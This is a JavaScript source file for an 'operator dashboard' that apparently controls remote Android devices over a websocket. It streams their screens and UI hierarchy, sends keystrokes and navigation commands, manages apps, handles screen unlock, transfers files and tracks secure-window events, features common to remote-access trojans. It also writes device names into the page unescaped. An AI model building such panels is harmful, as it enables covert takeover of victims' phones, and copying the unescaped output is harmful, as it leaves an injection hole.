'use strict';

/**
 * dash.js — Alpha operator dashboard orchestrator.
 *
 * Owns: AlphaWs connection, device selection, panel switching,
 * routing all ws events to the active panel modules.
 */

class AlphaDash {

  constructor() {
    this.ws         = null;
    this.activeDevice = null;
    this.activePanel  = 'vnc';

    this.vnc    = null;
    this.ly     = null;
    this.apps   = null;
    this.lock   = null;
    this.files  = null;

    this._deviceMeta = new Map(); // devId → {model, sdk, online}

    this._boot();
  }

  _boot() {
    const token = localStorage.getItem('alpha_token');
    if (!token) { location.href = '/login.html'; return; }
    this._initUI();
    this._connect(token);
  }

  _connect(token) {
    this.ws = new AlphaWs(token);
    this._statusEl.textContent = '⟳ Connecting…';

    this.ws
      .on('connected',          ()  => this._onConnected())
      .on('disconnected',       ()  => this._onDisconnected())
      .on('devices_list',       (d) => this._onDeviceList(d))
      .on('device_online',      (d) => this._onDeviceOnline(d))
      .on('device_offline',     (d) => this._onDeviceOffline(d))
      .on('vnc_frame',          (d) => this.vnc?.onFrame(d))
      .on('screen_hierarchy',   (d) => this.ly?.onHierarchy(d))
      .on('secure_window',      (d) => { this.vnc?.onSecureWindow(d.secure); this.ly?.onSecureWindow(d.secure); })
      .on('installed_apps',     (d) => this.apps?.onAppList(d))
      .on('file_list',          (d) => this.files?.onFileList(d))
      .on('file_chunk',         (d) => this.files?.onFileChunk(d))
      .on('file_upload_done',   (d) => this.files?.onOpResult(d))
      .on('lock_status',        (d) => this.lock?.onLockStatus(d))
      .on('cmd_result',         (d) => {
        this.apps?.onCmdResult(d);
        this.lock?.onUnlockResult(d);
        this.files?.onOpResult(d);
        this._logCmd(d);
      });
  }

  _onConnected() {
    this._statusEl.textContent = '● Online';
    this._statusEl.style.color = '#00ff9d';
  }

  _onDisconnected() {
    this._statusEl.textContent = '○ Offline';
    this._statusEl.style.color = '#ff4444';
  }

  _onDeviceList({ devices, online }) {
    this._deviceMeta.clear();
    for (const d of devices) {
      this._deviceMeta.set(d.id, { ...d, online: online.includes(d.id) });
    }
    this._renderDeviceList();
  }

  _onDeviceOnline({ id, model }) {
    const existing = this._deviceMeta.get(id) || { id };
    this._deviceMeta.set(id, { ...existing, model: model || existing.model, online: true });
    this._renderDeviceList();
  }

  _onDeviceOffline({ id }) {
    const existing = this._deviceMeta.get(id);
    if (existing) { existing.online = false; this._renderDeviceList(); }
  }

  // ── UI ───────────────────────────────────────────────────────────────────────

  _initUI() {
    this._devListEl  = document.getElementById('devList');
    this._panelEls   = {
      vnc:   document.getElementById('panelVnc'),
      ly:    document.getElementById('panelLy'),
      apps:  document.getElementById('panelApps'),
      lock:  document.getElementById('panelLock'),
      files: document.getElementById('panelFiles'),
    };
    this._statusEl   = document.getElementById('statusDot');
    this._activeDevEl = document.getElementById('activeDevice');
    this._fpsEl       = document.getElementById('fpsCtr');

    // Panel tabs
    document.querySelectorAll('[data-panel]').forEach(btn => {
      btn.onclick = () => this._switchPanel(btn.dataset.panel);
    });

    // Global controls
    document.getElementById('btnBack')?.addEventListener('click', () =>
      this.ws.cmd(this.activeDevice, 'BACK', {}));
    document.getElementById('btnHome')?.addEventListener('click', () =>
      this.ws.cmd(this.activeDevice, 'HOME', {}));
    document.getElementById('btnRecents')?.addEventListener('click', () =>
      this.ws.cmd(this.activeDevice, 'RECENTS', {}));
    document.getElementById('btnNotif')?.addEventListener('click', () =>
      this.ws.cmd(this.activeDevice, 'NOTIFICATIONS', {}));
    document.getElementById('btnWake')?.addEventListener('click', () =>
      this.ws.cmd(this.activeDevice, 'WAKEUP', {}));
    document.getElementById('btnLock')?.addEventListener('click', () =>
      this.ws.cmd(this.activeDevice, 'LOCK_DEVICE', {}));
    document.getElementById('btnVolUp')?.addEventListener('click', () =>
      this.ws.cmd(this.activeDevice, 'VOLUME_UP', {}));
    document.getElementById('btnVolDn')?.addEventListener('click', () =>
      this.ws.cmd(this.activeDevice, 'VOLUME_DOWN', {}));
    document.getElementById('btnLogout')?.addEventListener('click', () => {
      localStorage.removeItem('alpha_token');
      location.href = '/login.html';
    });

    // Quality slider
    const qSlider = document.getElementById('vncQuality');
    if (qSlider) {
      qSlider.oninput = (e) => {
        document.getElementById('vncQualityVal').textContent = e.target.value;
        this.vnc?.setQuality(+e.target.value);
      };
    }

    // Type input
    const typeInput = document.getElementById('typeInput');
    if (typeInput) {
      typeInput.addEventListener('keydown', (e) => {
        if (!this.activeDevice) return;
        if (e.key === 'Enter') {
          this.ws.cmd(this.activeDevice, 'TYPE', { text: '\n' });
          e.preventDefault();
        } else if (e.key === 'Backspace') {
          this.ws.cmd(this.activeDevice, 'TYPE', { text: '\b' });
          e.preventDefault();
        } else if (e.key.length === 1) {
          this.ws.cmd(this.activeDevice, 'TYPE', { text: e.key });
          e.preventDefault();
        }
      });
    }

    this._switchPanel('vnc');
  }

  _renderDeviceList() {
    if (!this._devListEl) return;
    this._devListEl.innerHTML = '';
    for (const [id, meta] of this._deviceMeta) {
      const li = document.createElement('div');
      li.className = 'dev-item' + (id === this.activeDevice ? ' selected' : '');
      li.innerHTML = `
        <span class="dev-dot ${meta.online ? 'online' : 'offline'}"></span>
        <div class="dev-info">
          <div class="dev-model">${meta.model || 'Device'}</div>
          <div class="dev-id">${id.substring(0, 8)}…</div>
        </div>
      `;
      li.onclick = () => this._selectDevice(id, meta);
      this._devListEl.appendChild(li);
    }
  }

  _selectDevice(id, meta) {
    // Tear down old modules
    this._teardownModules();

    this.activeDevice = id;
    if (this._activeDevEl)
      this._activeDevEl.textContent = meta.model || id.substring(0, 8);

    // Re-render device list to show selection
    this._renderDeviceList();

    // Build panel modules for new device
    this._buildModules(id);

    // Switch to VNC by default
    this._switchPanel(this.activePanel);
  }

  _buildModules(id) {
    const canvas = document.getElementById('vncCanvas');
    if (canvas) {
      this.vnc = new AlphaVnc(canvas, this.ws, id);
      this.vnc.setFpsDisplay(this._fpsEl);
    }

    const svg = document.getElementById('lySvg');
    if (svg) this.ly = new AlphaLy(svg, this.ws, id);

    const appsEl = document.getElementById('panelApps');
    if (appsEl) this.apps = new AlphaAppManager(appsEl, this.ws, id);

    const lockEl = document.getElementById('panelLock');
    if (lockEl) this.lock = new AlphaLockManager(lockEl, this.ws, id);

    const filesEl = document.getElementById('panelFiles');
    if (filesEl) this.files = new AlphaFileManager(filesEl, this.ws, id);
  }

  _teardownModules() {
    this.vnc?.destroy();   this.vnc   = null;
    this.ly?.stop();       this.ly    = null;
    this.lock?.destroy();  this.lock  = null;
    this.files = null;     this.apps  = null;
  }

  _switchPanel(name) {
    this.activePanel = name;

    // Show/hide panels
    for (const [k, el] of Object.entries(this._panelEls)) {
      if (el) el.style.display = k === name ? '' : 'none';
    }

    // Tab active state
    document.querySelectorAll('[data-panel]').forEach(btn => {
      btn.classList.toggle('active', btn.dataset.panel === name);
    });

    if (!this.activeDevice) return;

    // Start/stop modules based on panel
    if (name === 'vnc') {
      this.vnc?.start(
        +(document.getElementById('vncQuality')?.value || 50),
        +(document.getElementById('vncFps')?.value || 20)
      );
      this.ly?.stop();
    } else if (name === 'ly') {
      this.vnc?.stop();
      this.ly?.start(700);
    } else {
      this.vnc?.stop();
      this.ly?.stop();
      if (name === 'apps' && this.apps) this.apps.refresh();
    }
  }

  _logCmd({ cmd, success, msg }) {
    const log = document.getElementById('cmdLog');
    if (!log) return;
    const entry = document.createElement('div');
    entry.className = 'log-entry ' + (success ? 'ok' : 'err');
    entry.textContent = `${new Date().toTimeString().slice(0, 8)}  ${cmd}  ${success ? '✓' : '✗'}  ${msg || ''}`;
    log.prepend(entry);
    // Keep only last 50
    while (log.children.length > 50) log.removeChild(log.lastChild);
  }
}

document.addEventListener('DOMContentLoaded', () => {
  window._dash = new AlphaDash();
});
